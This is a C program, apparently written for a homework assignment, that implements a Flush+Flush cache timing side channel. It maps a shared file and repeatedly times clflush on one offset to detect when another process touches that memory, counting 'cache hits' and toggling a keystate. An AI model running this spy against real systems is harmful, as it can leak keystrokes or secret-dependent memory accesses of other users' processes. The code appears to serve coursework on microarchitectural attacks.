#define Baleba // Macro defined as Baleba
#include <pthread.h>// used to create threads, to run process on multiple processors 
#include <unistd.h>// access to functions for process control
#include <fcntl.h>// gives us file control operations 
#include <stdio.h>// input output files 
#include <stdlib.h>// for memory management, program control, conversions and random number generation
#include <time.h>// will use for timing manipulations
#include <sys/shm.h> // access to the system V shared memory facility
#include <sys/mman.h> // for creating and protecting memory-mapped regions
#include <sys/ipc.h>// data structures, constants and functions
#include <stdint.h>// gives fixed with integers, so code can be used accross platforms 
#include <x86intrin.h>
#include <sched.h>
/*
1.refer to homeowork 1, load address into the cache

2. access one of the address into the cache

3. fence everything so nothing runs out of order.  all of atomic code

4. can use open source code, but cant use AI to explain the code

5. artemisia or skylake. if your not able to see a difference try another processor

6. fence before doing the timing because timing because can run before. fence even the timing instruction

7. turn off complier optimization

8. make sure there is no fancy oppurtunity to any prefetcher 
*/

size_t start = 0; // unsigned int, size given by our system
size_t keystate = 0; // unsigned int, size given by our system
size_t kpause = 0; // unsigned int, size given by our sytem 


void flushandflush(void* addr) // function creation, argument is our address pointer 
{
_mm_lfence();// fence previous intructions 

    size_t time = __rdtsc();  // we create a timer of our clock 

_mm_lfence();// fence the previous instruction 

    _mm_clflush(addr); // flush the address 

_mm_lfence();// fence the previous instruction

    size_t delta = __rdtsc() - time; //get time of flush instruction 

_mm_lfence();// fence instruction

    printf("RAW,%zu\n", delta); // pritn delta value
    
_mm_lfence(); // fence instruction


    if(delta >= 172 && delta <= 200){ 

        if (kpause > 1000){

            printf("cache Hit(%zu) after %10lu cycles, t=%10lu us\n", delta, kpause, (time-start)/2600);

_mm_lfence();// fence printf instruction

            keystate = (keystate+1) % 2;
        }
        kpause = 0;
    }

    else 
        kpause++;

}//end of flushandreaload



// main function 


int main(int argc, char** argv){ // integer containing the number of command-line argumetns  

    char* name = argv[1]; // points to our string 
    char* offset_pointer = argv[2]; // pointer to argv value which will probably be a number
_mm_lfence();
    if(argc != 3){return 1;}

    
    unsigned int offset = 0;


    if (sscanf(offset_pointer, "%x", &offset) != 1) {
    printf("Invalid hexadecimal offset\n");
    return 1;
}


    int fd = open(name,O_RDONLY);// open the file "name" in read only mode


    if(fd < 3){ return 2;} // checking if opening the file worked 

    unsigned char* addr = mmap(NULL,64*1024*1024,PROT_READ,MAP_SHARED,fd,0);// were mapping the file into memory

    if(addr == (void*)-1){ // checking wether mmap failed 
        return 3;
    }

    start = __rdtsc(); // start timer and passing an address 

    while(1){

        flushandflush(addr + offset);

        for(int i = 0; i < 30; ++i){ // sched_yield is performed 30 times 
            sched_yield();
        }
    }



}// end main 
